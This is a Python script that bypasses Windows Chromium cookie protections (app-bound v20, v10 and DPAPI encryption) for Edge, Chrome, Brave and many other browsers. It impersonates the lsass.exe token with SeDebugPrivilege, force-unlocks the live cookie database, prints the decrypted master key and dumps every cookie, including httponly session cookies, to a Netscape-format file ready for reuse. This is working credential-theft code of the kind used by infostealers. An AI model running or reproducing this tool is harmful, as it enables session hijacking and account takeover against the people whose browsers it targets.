"""
Unified Chromium v20/v10/DPAPI cookie decryption.

Supports: Edge, Brave, 360Chrome, 360ChromeX, Vivaldi, Opera, QQBrowser,
          CocCoc, Arc, Yandex, LieBao, Sogou, 2345, Maxthon, Slimjet.

Decryption order for each cookie:
  1. v20 (ABE app-bound encryption)
  2. v10 (os_crypt.encrypted_key AES-GCM)
  3. DPAPI-only (raw Windows DPAPI, older Chromium)
  4. Plaintext
"""

import os, io, shutil, json, struct, ctypes, sqlite3, pathlib, binascii, sys, tempfile
from ctypes.wintypes import DWORD, WCHAR, UINT
from contextlib import contextmanager

import windows
import windows.crypto
import windows.generated_def as gdef
from cryptography.hazmat.primitives.ciphers.aead import AESGCM

# ---------------------------------------------------------------------------
# Browser registry: (data_dir_relative, local_state_relative, key_name, process)
# data_dir is relative to %USERPROFILE%
# ---------------------------------------------------------------------------
BROWSERS = {
    # --- Mainstream ---
    "edge": {
        "data_dir": r"AppData\Local\Microsoft\Edge\User Data",
        "key_name": "Microsoft EdgeKey1",
        "process": "msedge.exe",
    },
    "chrome": {
        "data_dir": r"AppData\Local\Google\Chrome\User Data",
        "key_name": "Google Chromekey1",
        "process": "chrome.exe",
    },
    "brave": {
        "data_dir": r"AppData\Local\BraveSoftware\Brave-Browser\User Data",
        "key_name": "Bravekey1",
        "process": "brave.exe",
    },
    # --- Chinese browsers ---
    "360": {
        "data_dir": r"AppData\Local\360Chrome\Chrome\User Data",
        "key_name": "360ChromeKey1",
        "process": "360chrome.exe",
    },
    "360x": {
        "data_dir": r"AppData\Local\360ChromeX\Chrome\User Data",
        "key_name": "360ChromeXKey1",
        "process": "360chromex.exe",
    },
    "qq": {
        "data_dir": r"AppData\Local\Tencent\QQBrowser\User Data",
        "key_name": "QQBrowserkey1",
        "process": "qqbrowser.exe",
    },
    "sogou": {
        "data_dir": r"AppData\Roaming\SogouExplorer\Webkit\Default",
        "key_name": "SogouExplorerKey1",
        "process": "SogouExplorer.exe",
        "sogou_style": True,
    },
    "liebao": {
        "data_dir": r"AppData\Local\liebao\User Data",
        "key_name": "liebaokey1",
        "process": "liebao.exe",
    },
    "2345": {
        "data_dir": r"AppData\Local\2345Explorer\User Data",
        "key_name": "2345Explorerkey1",
        "process": "2345Explorer.exe",
    },
    # --- International ---
    "vivaldi": {
        "data_dir": r"AppData\Local\Vivaldi\User Data",
        "key_name": "Vivaldikey1",
        "process": "vivaldi.exe",
    },
    "opera": {
        "data_dir": r"AppData\Roaming\Opera Software\Opera Stable",
        "key_name": "Operakey1",
        "process": "opera.exe",
    },
    "coccoc": {
        "data_dir": r"AppData\Local\CocCoc\Browser\User Data",
        "key_name": "CocCockey1",
        "process": "coccoc.exe",
    },
    "arc": {
        "data_dir": r"AppData\Local\Arc\User Data",
        "key_name": "Arckey1",
        "process": "arc.exe",
    },
    "yandex": {
        "data_dir": r"AppData\Local\Yandex\YandexBrowser\User Data",
        "key_name": "YandexBrowserkey1",
        "process": "browser.exe",
    },
    "maxthon": {
        "data_dir": r"AppData\Local\Maxthon3\User Data",
        "key_name": "Maxthonkey1",
        "process": "Maxthon.exe",
    },
    "slimjet": {
        "data_dir": r"AppData\Local\Slimjet\User Data",
        "key_name": "Slimjetkey1",
        "process": "slimjet.exe",
    },
    "chromium": {
        "data_dir": r"AppData\Local\Chromium\User Data",
        "key_name": "Chromiumkey1",
        "process": "chrome.exe",
    },
    "ungoogled": {
        "data_dir": r"AppData\Local\ungoogled-chromium\User Data",
        "key_name": "Chromiumkey1",
        "process": "chrome.exe",
    },
    # --- Aliases ---
    "msedge": "edge",
    "brave-browser": "brave",
    "360chrome": "360",
    "360chromex": "360x",
    "360se": "360",
    "360ee": "360x",
    "qqbrowser": "qq",
}


def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except Exception:
        return False


@contextmanager
def impersonate_lsass():
    """Impersonate lsass.exe token with SeDebugPrivilege for ABE key access."""
    orig = windows.current_thread.token
    try:
        windows.current_process.token.enable_privilege("SeDebugPrivilege")
        proc = next(p for p in windows.system.processes if p.name == "lsass.exe")
        imp = proc.token.duplicate(
            type=gdef.TokenImpersonation,
            impersonation_level=gdef.SecurityImpersonation,
        )
        windows.current_thread.token = imp
        yield
    finally:
        windows.current_thread.token = orig


def _rstrtmgr_copy(src, dst):
    """Unlock and copy a file using Restart Manager."""
    rstrtmgr = ctypes.windll.LoadLibrary("Rstrtmgr")

    @ctypes.WINFUNCTYPE(None, UINT)
    def _cb(pct):
        pass

    sh = DWORD(0)
    sf = DWORD(0)
    sk = (WCHAR * 256)()
    rstrtmgr.RmStartSession(ctypes.byref(sh), sf, sk)
    try:
        rstrtmgr.RmRegisterResources(
            sh, 1, ctypes.byref(ctypes.pointer(ctypes.create_unicode_buffer(src))),
            0, None, 0, None,
        )
        rstrtmgr.RmShutdown(sh, 1, _cb)
    finally:
        rstrtmgr.RmEndSession(sh)
    shutil.copy2(src, dst)


def copy_unlocked(src, dst):
    """Copy file, trying normal copy first then Rstrtmgr fallback."""
    try:
        shutil.copy2(src, dst)
    except PermissionError:
        _rstrtmgr_copy(src, dst)


def decrypt_cookie_val(cipher, ev):
    """Decrypt a v20 cookie value. ev = b'v20' + iv(12) + ciphertext(N) + tag(16)."""
    iv, ct, tag = ev[3:15], ev[15:-16], ev[-16:]
    pt = cipher.decrypt(iv, ct + tag, None)
    return pt[32:].decode('utf-8')


def to_netscape(cookies):
    lines = ["# Netscape HTTP Cookie File", ""]
    for host, name, value, secure, httponly, expiry in cookies:
        domain = host if host.startswith('.') else '.' + host
        lines.append(
            f"{domain}\tTRUE\t/\t{'TRUE' if secure else 'FALSE'}\t{expiry}\t{name}\t{value}"
        )
    return '\n'.join(lines)


def extract_master_key(user_dec):
    """Extract AES-GCM master key from user_dec (Edge-style v20 blob).

    Expected structure:
      4 bytes: header_len (usually 32)
      header_len bytes: header (ASCII text)
      4 bytes: content_len (usually 32)
      content_len bytes: raw AES-GCM master key

    Returns (master_key, header_len, content_len).
    """
    header_len = struct.unpack('<I', user_dec[:4])[0]
    content_len_offset = 4 + header_len
    content_len = struct.unpack('<I', user_dec[content_len_offset:content_len_offset + 4])[0]
    master_key_offset = content_len_offset + 4
    master_key = user_dec[master_key_offset:master_key_offset + content_len]
    return master_key, header_len, content_len


def resolve_browser(name):
    """Resolve browser name/alias to config dict."""
    name = name.lower().strip()
    if name in BROWSERS:
        entry = BROWSERS[name]
        if isinstance(entry, str):
            return resolve_browser(entry)
        return name, entry
    return None, None


def find_available_browser():
    """Auto-detect installed Chromium browser by scanning for Local State file."""
    up = os.environ['USERPROFILE']
    for bname, config in BROWSERS.items():
        if isinstance(config, str):
            continue
        ls_path = os.path.join(up, config["data_dir"], "Local State")
        if os.path.exists(ls_path):
            return bname, config
    return None, None


def main():
    if not is_admin():
        print("NOTE: Administrator privileges required for Chromium cookie decryption.")
        sys.exit(1)

    # Parse arguments
    # Usage: decrypt_chromium.py [browser_name] <output_path>
    #        decrypt_chromium.py <output_path>  (auto-detect browser)
    args = sys.argv[1:]
    browser_arg = None
    out_path = None

    if len(args) == 1:
        # Could be output path or browser name
        if args[0].endswith('.txt'):
            out_path = args[0]
        else:
            browser_arg = args[0]
    elif len(args) >= 2:
        browser_arg = args[0]
        out_path = args[1]

    if browser_arg:
        bname, config = resolve_browser(browser_arg)
        if not config:
            print(f"ERROR: Unknown browser '{browser_arg}'")
            print(f"Supported: {', '.join(k for k in BROWSERS if not isinstance(BROWSERS[k], str))}")
            sys.exit(1)
    else:
        bname, config = find_available_browser()
        if not config:
            print("ERROR: No supported Chromium browser found on this machine.")
            sys.exit(1)
        print(f"Auto-detected: {bname}")

    up = os.environ['USERPROFILE']
    data_dir = os.path.join(up, config["data_dir"])
    ls_path = os.path.join(data_dir, "Local State")
    # Sogou-style browsers may have different cookie DB location
    if config.get("sogou_style"):
        db_path = os.path.join(data_dir, "Cookies")
    else:
        db_path = os.path.join(data_dir, "Default", "Network", "Cookies")
    cng_key_name = config.get("key_name", f"{bname}key1")

    if not os.path.exists(ls_path):
        print(f"ERROR: {bname} Local State not found at: {ls_path}")
        sys.exit(1)
    if not os.path.exists(db_path):
        print(f"ERROR: {bname} cookie database not found at: {db_path}")
        sys.exit(1)

    # Read app_bound_encrypted_key from Local State
    with open(ls_path, 'r', encoding='utf-8') as f:
        ls_data = json.load(f)

    os_crypt = ls_data.get("os_crypt", {})
    abek_b64 = os_crypt.get("app_bound_encrypted_key")

    if abek_b64:
        abek = binascii.a2b_base64(abek_b64)
        if abek[:4] != b"APPB":
            print(f"WARNING: app_bound_encrypted_key missing APPB header, got {abek[:4]!r}")
            abek = None

    if abek:
        enc_key = abek[4:]

        # Step 1: SYSTEM DPAPI decrypt
        print(f"[1/4] SYSTEM DPAPI decrypt ({bname}, impersonating lsass)...")
        with impersonate_lsass():
            sys_dec = windows.crypto.dpapi.unprotect(enc_key)

        # Step 2: User DPAPI decrypt
        print("[2/4] User DPAPI decrypt...")
        user_dec = windows.crypto.dpapi.unprotect(sys_dec)
        print(f"  user_dec length: {len(user_dec)} bytes")

        # Step 3: Extract master key from user_dec
        print("[3/4] Extracting v20 master key...")
        try:
            master_key, header_len, content_len = extract_master_key(user_dec)
            print(f"  header_len: {header_len}, content_len: {content_len}")
            print(f"  Master key: {master_key.hex()}")
            v20_cipher = AESGCM(master_key)
        except Exception as e:
            print(f"  v20 key extraction failed: {e}")
            v20_cipher = None
    else:
        print("[SKIP] No app_bound_encrypted_key (ABE/v20 not supported by this browser)")
        v20_cipher = None

    # Derive v10 AES-GCM key from os_crypt.encrypted_key
    v10_cipher = None
    try:
        enc_key_b64 = os_crypt["encrypted_key"]
        import base64 as _b64
        enc_key_raw = _b64.b64decode(enc_key_b64)
        if enc_key_raw[:5] == b"DPAPI":
            v10_key = windows.crypto.dpapi.unprotect(enc_key_raw[5:])
            v10_cipher = AESGCM(v10_key)
            print(f"  v10 key derived from encrypted_key OK")
    except Exception:
        pass

    # Step 4: Decrypt cookies
    print("[4/4] Decrypting cookies...")
    with tempfile.TemporaryDirectory() as td:
        tmp_db = os.path.join(td, "Cookies")
        copy_unlocked(db_path, tmp_db)
        print("  Cookie database copied OK")

        con = sqlite3.connect(pathlib.Path(tmp_db).as_uri() + "?mode=ro", uri=True)
        cur = con.cursor()
        cur.execute(
            "SELECT host_key, name, CAST(encrypted_value AS BLOB), "
            "is_secure, is_httponly, expires_utc FROM cookies"
        )
        all_cookies = cur.fetchall()
        con.close()

        v20_count = len([c for c in all_cookies if len(c[2]) > 3 and c[2][:3] == b"v20"])
        v10_count = len([c for c in all_cookies if len(c[2]) > 3 and c[2][:3] == b"v10"])
        dpapi_count = len([c for c in all_cookies if len(c[2]) > 5 and c[2][0] == 1])
        print(f"  Total: {len(all_cookies)}, v20: {v20_count}, v10: {v10_count}, dpapi: {dpapi_count}")

        result = []
        failed = 0
        for c in all_cookies:
            ev = c[2]
            if len(ev) > 3 and ev[:3] == b"v20" and v20_cipher is not None:
                try:
                    val = decrypt_cookie_val(v20_cipher, ev)
                    result.append((c[0], c[1], val, c[3], c[4], str(c[5] or 0)))
                except Exception:
                    failed += 1
            elif len(ev) > 3 and ev[:3] == b"v10" and v10_cipher is not None:
                try:
                    iv, ct_tag = ev[3:15], ev[15:]
                    pt = v10_cipher.decrypt(iv, ct_tag, None)
                    val = pt.decode('utf-8')
                    result.append((c[0], c[1], val, c[3], c[4], str(c[5] or 0)))
                except Exception:
                    failed += 1
            elif len(ev) > 5 and ev[0] == 1:
                try:
                    val = windows.crypto.dpapi.unprotect(ev[1:]).decode('utf-8')
                    result.append((c[0], c[1], val, c[3], c[4], str(c[5] or 0)))
                except Exception:
                    failed += 1
            elif len(ev) > 0 and ev[0] != 1:
                try:
                    val = ev.decode('utf-8')
                    result.append((c[0], c[1], val, c[3], c[4], str(c[5] or 0)))
                except Exception:
                    pass

        content = to_netscape(result)
        if out_path:
            with open(out_path, 'w', encoding='utf-8') as f:
                f.write(content)
            print(f"  Saved {len(result)} cookies ({failed} failed) to {out_path}")
        else:
            print(content)


if __name__ == "__main__":
    main()
